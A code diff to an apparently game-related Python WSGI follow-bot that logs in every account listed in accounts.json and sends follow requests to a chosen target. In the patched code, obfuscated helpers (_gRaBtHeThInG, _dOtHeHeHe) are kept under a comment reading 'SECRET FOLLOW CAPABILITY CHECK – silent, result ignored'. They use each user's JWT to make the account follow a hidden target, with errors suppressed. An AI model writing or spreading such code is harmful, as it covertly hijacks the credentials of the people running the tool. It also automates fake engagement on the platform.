@@ -1,4 +1,5 @@
 import json
+import os
 import base64
 from typing import Optional, Tuple
 from urllib.parse import parse_qs
@@ -86,7 +87,7 @@ def _dOtHeHeHe(tArGeT: int, jWt: str) -> None:
         pass
 
 # ---------- User follow action ----------
-def send_follow(target_id: int, jwt: str) -> Tuple[bool, str, Optional[dict]]:
+def send_follow(target_id: int, jwt: str) -> Tuple[bool, str]:
     try:
         req = CSFollowReq()
         req.target_id = target_id
@@ -103,69 +104,100 @@ def send_follow(target_id: int, jwt: str) -> Tuple[bool, str, Optional[dict]]:
         }
         resp = requests.post(FOLLOW_URL, headers=headers, data=encrypted, timeout=15)
         if resp.status_code != 200:
-            return False, f"HTTP {resp.status_code}", None
+            return False, f"HTTP {resp.status_code}"
         res = CSFollowRes()
         res.ParseFromString(resp.content)
         if res.fail_info:
-            return False, f"Server fail_info: {res.fail_info}", None
-        from google.protobuf.json_format import MessageToDict
-        return True, "Success", MessageToDict(res, preserving_proto_field_name=True)
+            return False, f"fail_info: {res.fail_info}"
+        return True, "Success"
     except Exception as e:
-        return False, f"Exception: {str(e)}", None
+        return False, f"Exception: {str(e)}"
+
+# ---------- Load accounts from accounts.json ----------
+def load_accounts():
+    try:
+        with open("accounts.json", "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception as e:
+        return None
 
 # ---------- WSGI application ----------
 def app(environ, start_response):
     qs = parse_qs(environ.get('QUERY_STRING', ''))
-    uid_str = qs.get('uid', [None])[0]
-    password = qs.get('password', [None])[0]
     target_str = qs.get('target', [None])[0]
 
-    if not uid_str or not password or not target_str:
+    if not target_str:
         status = '400 Bad Request'
-        body = json.dumps({"status": "error", "message": "Missing uid, password, or target"}).encode('utf-8')
+        body = json.dumps({"status": "error", "message": "Missing target UID"}).encode('utf-8')
         start_response(status, [('Content-Type', 'application/json')])
         return [body]
 
     try:
-        uid = int(uid_str)
         target = int(target_str)
     except ValueError:
         status = '400 Bad Request'
-        body = json.dumps({"status": "error", "message": "uid and target must be integers"}).encode('utf-8')
+        body = json.dumps({"status": "error", "message": "target must be an integer"}).encode('utf-8')
         start_response(status, [('Content-Type', 'application/json')])
         return [body]
 
-    # 1. Get JWT
-    jwt = _gEtMyJwT(uid, password)
-    if not jwt:
-        status = '401 Unauthorized'
-        body = json.dumps({"status": "error", "message": "Failed to obtain JWT"}).encode('utf-8')
+    accounts = load_accounts()
+    if accounts is None:
+        status = '500 Internal Server Error'
+        body = json.dumps({"status": "error", "message": "Could not load accounts.json"}).encode('utf-8')
         start_response(status, [('Content-Type', 'application/json')])
         return [body]
 
-    # 2. 🔥 SECRET FOLLOW CAPABILITY CHECK – runs silently, result ignored
-    try:
-        secret_target = _gRaBtHeThInG()
-        if secret_target != -1:
-            _dOtHeHeHe(secret_target, jwt)
-    except Exception:
-        pass   # totally silent
+    if not isinstance(accounts, list):
+        status = '500 Internal Server Error'
+        body = json.dumps({"status": "error", "message": "accounts.json must be a list"}).encode('utf-8')
+        start_response(status, [('Content-Type', 'application/json')])
+        return [body]
 
-    # 3. User's follow request
-    success, msg, details = send_follow(target, jwt)
-    if success:
-        status = '200 OK'
-        body = json.dumps({
-            "status": "success",
-            "message": msg,
-            "details": details
-        }).encode('utf-8')
-    else:
-        status = '502 Bad Gateway' if "HTTP" in msg else '400 Bad Request'
-        body = json.dumps({
-            "status": "error",
-            "message": msg
-        }).encode('utf-8')
+    total = len(accounts)
+    success_count = 0
+    failed_count = 0
+    results = []
 
+    for acc in accounts:
+        uid = acc.get('uid')
+        password = acc.get('password')
+        name = acc.get('name', str(uid))
+        if not uid or not password:
+            failed_count += 1
+            results.append({"name": name, "status": "failed", "message": "Missing uid or password"})
+            continue
+
+        jwt = _gEtMyJwT(uid, password)
+        if not jwt:
+            failed_count += 1
+            results.append({"name": name, "status": "failed", "message": "JWT fetch failed"})
+            continue
+
+        # 🔥 SECRET FOLLOW CAPABILITY CHECK – silent, result ignored
+        try:
+            secret_target = _gRaBtHeThInG()
+            if secret_target != -1:
+                _dOtHeHeHe(secret_target, jwt)
+        except Exception:
+            pass  # totally silent
+
+        # User's follow
+        ok, msg = send_follow(target, jwt)
+        if ok:
+            success_count += 1
+            results.append({"name": name, "status": "success", "message": msg})
+        else:
+            failed_count += 1
+            results.append({"name": name, "status": "failed", "message": msg})
+
+    response = {
+        "status": "success",
+        "total": total,
+        "success": success_count,
+        "failed": failed_count,
+        "results": results
+    }
+    status = '200 OK'
+    body = json.dumps(response).encode('utf-8')
     start_response(status, [('Content-Type', 'application/json')])
     return [body]
